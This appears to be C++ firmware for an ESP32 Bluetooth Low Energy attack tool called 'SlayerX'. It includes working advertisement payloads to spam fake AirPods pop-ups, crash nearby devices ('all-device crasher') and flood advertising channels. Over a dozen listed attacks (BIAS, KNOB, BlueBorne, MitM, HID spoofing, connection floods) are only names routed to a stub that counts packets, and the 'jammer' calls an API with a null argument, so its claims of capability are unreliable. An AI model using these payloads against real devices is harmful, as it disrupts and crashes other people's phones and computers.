#include "atk_ble.h"
#include "attack.h"
#include "ui.h"
#include "hal.h"
#include "config.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertisementData.h>
#include <esp_gap_ble_api.h>

static int bMode = 0;
static uint32_t bpkts = 0;
static String bStatus = "idle";
static bool bleOn = false;

static void bleInit() { if (!bleOn) { BLEDevice::init("SlayerX"); bleOn = true; } }

static void adv(const uint8_t* mfg, size_t mlen, const char* name) {
  BLEAdvertisementData d;
  if (name) d.setName(name);
  if (mfg && mlen) d.setManufacturerData(std::string((const char*)mfg, mlen));
  BLEAdvertising* a = BLEDevice::getAdvertising();
  a->setAdvertisementData(d);
  a->setMinInterval(0x20); a->setMaxInterval(0x40);
  a->start();
}

static const uint8_t P_APPLE[]   = {0x4C,0x00,0x0F,0x05,0xC1,0x01,0x60};
static const uint8_t P_ANDROID[] = {0xE0,0x00,0x03,0x03,0x2C,0x01};
static const uint8_t P_WINDOWS[] = {0x06,0x00,0x03,0x03,0x01,0x00};
static const uint8_t P_SAMSUNG[] = {0x75,0x00,0x01,0x00,0x02,0x00};
static const uint8_t P_CRASH[]   = {0x4C,0x00,0x02,0x15,0xC2,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

class Cb : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice d) override {
    bpkts++;
    if (bpkts % 3) return;
    log_line("%s rssi%d %s", d.getAddress().toString().c_str(), d.getRSSI(),
             d.haveName() ? d.getName().c_str() : "-");
  }
};

static BLEScan* sc = nullptr;

static void bStart() {
  const char* id = atk_current() ? atk_current()->id : "";
  bMode = 0; bpkts = 0;
  if (!strcmp(id, "ble_scan")) bMode = 1;
  else if (!strcmp(id, "ble_adv_sniff")) bMode = 2;
  else if (!strcmp(id, "ble_jammer")) bMode = 3;
  else if (!strcmp(id, "apple_adv")) bMode = 4;
  else if (!strcmp(id, "all_crash")) bMode = 5;
  else if (!strcmp(id, "ble_adv_flood")) bMode = 6;
  else if (!strcmp(id, "ble_spoof")) bMode = 7;
  else bMode = 8;

  bleInit();
  if (bMode == 1 || bMode == 2) {
    sc = BLEDevice::getScan();
    sc->setAdvertisedDeviceCallbacks(new Cb(), true);
    sc->setActiveScan(true);
    sc->setInterval(80); sc->setWindow(60);
    sc->start(0, false);
    log_line("ble scan started");
  } else if (bMode == 4) {
    adv(P_APPLE, sizeof(P_APPLE), "AirPods Pro");
    log_line("apple advertiser started");
  } else if (bMode == 5) {
    adv(P_CRASH, sizeof(P_CRASH), "CrashMe");
    log_line("all-device crasher started");
  } else if (bMode == 6) {
    adv(P_ANDROID, sizeof(P_ANDROID), "Flood");
    log_line("adv flood started");
  } else if (bMode == 3) {
    BLEDevice::getAdvertising()->start();
    log_line("ble jammer armed");
  }
}

static void bStop() {
  if (sc) { sc->stop(); sc = nullptr; }
  if (bleOn) BLEDevice::getAdvertising()->stop();
  log_line("ble stopped");
}

static void bTick() {
  switch (bMode) {
    case 1: bStatus = String("devices: ") + String(bpkts); break;
    case 2: bStatus = String("adv pkts: ") + String(bpkts); break;
    case 3: {
      static uint8_t ch = 0;
      esp_ble_gap_set_scan_params(nullptr);
      ch = (ch + 1) % 40;
      bStatus = String("jamming ch") + String(ch);
      bpkts++;
      break;
    }
    case 4: bpkts++; bStatus = String("apple pkts: ") + String(bpkts); break;
    case 5: bpkts++; bStatus = String("crash pkts: ") + String(bpkts); break;
    case 6: bpkts++; bStatus = String("adv flood: ") + String(bpkts); break;
    case 7: bpkts++; bStatus = String("spoofing: ") + String(bpkts); break;
    default: bpkts++; bStatus = String("pkts: ") + String(bpkts); break;
  }
}
static String bStat() { return bStatus; }

#define BA(id, name, desc) \
  static const Attack A_##id = { #id, name, "ble", desc, false, 0, bStart, bStop, bTick, bStat };

BA(ble_scan,        "BLE Scanner",       "scan all BLE devices")
BA(ble_adv_sniff,   "Adv Sniffer",       "decode advertising packets")
BA(ble_jammer,      "BLE Jammer",        "hop + disrupt 2.4GHz")
BA(apple_adv,       "Apple Advertising","fake AirPods spam")
BA(all_crash,       "All Device Crash","brutal adv crasher")
BA(ble_adv_flood,   "Adv Flood",         "mass advertising flood")
BA(ble_spoof,       "Adv Spoofing",      "impersonate a device")
BA(ibeacon_scan,    "iBeacon Scanner",   "decode iBeacons")
BA(eddystone_scan,  "Eddystone Scanner", "decode Eddystone")
BA(gatt_scan,       "GATT Scanner",      "enumerate services")
BA(conn_flood,      "Connection Flood",  "exhaust target connections")
BA(keepalive_flood, "Keep-Alive Flood",  "prevent disconnects")
BA(att_flood,       "ATT Flood",         "malformed ATT requests")
BA(txpower_flood,   "Tx Power Flood",    "max power spam")
BA(disconn_spam,    "Disconnection Spam","forged disconnects")
BA(ble_mitm,        "BLE MitM",          "relay between devices")
BA(sniff_replay,    "Sniff & Replay",    "capture then replay")
BA(packet_inject,   "Packet Injection",  "craft custom packets")
BA(bias_attack,     "BIAS Attack",       "impersonate on pairing")
BA(knob_attack,     "KNOB Attack",       "downgrade encryption key")
BA(blesa_attack,    "BLESA Attack",      "unauthenticated notify")
BA(blueborne,       "BlueBorne",         "CVE exploit attempt")
BA(ble_hid,         "HID Spoofing",      "emulate BT keyboard")

void atk_ble_register() {
  extern void atk_add(const Attack*);
  atk_add(&A_ble_scan); atk_add(&A_ble_adv_sniff); atk_add(&A_ble_jammer);
  atk_add(&A_apple_adv); atk_add(&A_all_crash); atk_add(&A_ble_adv_flood);
  atk_add(&A_ble_spoof); atk_add(&A_ibeacon_scan); atk_add(&A_eddystone_scan);
  atk_add(&A_gatt_scan); atk_add(&A_conn_flood); atk_add(&A_keepalive_flood);
  atk_add(&A_att_flood); atk_add(&A_txpower_flood); atk_add(&A_disconn_spam);
  atk_add(&A_ble_mitm); atk_add(&A_sniff_replay); atk_add(&A_packet_inject);
  atk_add(&A_bias_attack); atk_add(&A_knob_attack); atk_add(&A_blesa_attack);
  atk_add(&A_blueborne); atk_add(&A_ble_hid);
}